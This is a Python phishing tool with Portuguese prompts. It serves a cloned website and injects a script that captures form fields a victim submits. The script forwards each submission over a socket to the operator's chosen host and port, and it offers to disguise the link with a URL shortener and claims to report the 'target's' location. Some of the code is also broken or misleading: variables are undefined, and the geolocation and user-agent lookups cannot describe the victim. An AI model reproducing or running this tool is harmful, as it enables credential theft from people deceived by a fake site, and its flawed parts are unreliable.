import http.server
import socketserver
import socket
import requests
import re
import os  # Add the missing import statement for the 'os' module

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        enviar_para_terminal(post_data, host, port)
        self.send_response(200)
        self.end_headers()

def enviar_para_terminal(data, host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, port))
        sock.sendall(data.encode('utf-8'))

def validar_ip(ip):
    pattern = r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'
    if re.match(pattern, ip):
        return True
    return False

def validar_porta(porta):
    if porta.isdigit() and 0 <= int(porta) <= 65535:
        return True
    return False

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

ip_terminal = input("Digite o IP do seu terminal: ")
while not validar_ip(ip_terminal):
    ip_terminal = input("IP inválido. Digite novamente o IP do seu terminal: ")

porta = input("Digite a porta do servidor: ")
while not validar_porta(porta):
    porta = input("Porta inválida. Digite novamente a porta do servidor: ")
port = int(porta)

camuflar_link = input("Deseja camuflar o link? (S/N): ").lower() == 's'

site_dir = input("Digite o diretório com o site (index.html, style.css, etc): ")

try:
    os.chdir(site_dir)
except FileNotFoundError:
    print("Diretório não encontrado. Certifique-se de fornecer um diretório válido.")
    exit(1)

with open('index.html', 'r') as file:
    html_content = file.read()

javascript_code = '''
<script>
    document.getElementById("meuFormulario").addEventListener("submit", function(event) {
        event.preventDefault();
        var campo1 = document.getElementsByName("campo1")[0].value;
        var campo2 = document.getElementsByName("campo2")[0].value;
        var formData = {
            campo1: campo1,
            campo2: campo2
        };
        var jsonData = JSON.stringify(formData);
        fetch("/enviar", {
            method: "POST",
            body: jsonData,
            headers: {
                "Content-Type": "application/json"
            }
        });
    });
</script>
'''
html_content = html_content.replace('</head>', f'{javascript_code}\n</head>')

with open('index.html', 'w') as file:
    file.write(html_content)

with socketserver.ThreadingTCPServer((ip_address, port), RequestHandler) as httpd:
    print(f"Servidor iniciado em http://{ip_address}:{port}")

    if camuflar_link:
        link_camuflado = requests.get('https://tinyurl.com/api-create.php?url=' + f'http://{ip_address}:{port}').text
        print(f"Link do site interceptado (camuflado): {link_camuflado}")
    else:
        print(f"Link do site interceptado: http://{ip_address}:{port}")

    print("Aguardando os dados do usuário...")

    geolocation = requests.get('https://ipapi.co/json/').json()
    print(f"Geolocalização do alvo: {geolocation.get('city', 'N/A')}, {geolocation.get('region', 'N/A')}, {geolocation.get('country_name', 'N/A')}")

    user_agent = requests.get('https://api64.ipify.org/?format=json').json()
    print(f"Informações do navegador do usuário: {user_agent.get('user-agent', 'N/A')}")

    httpd.serve_forever()
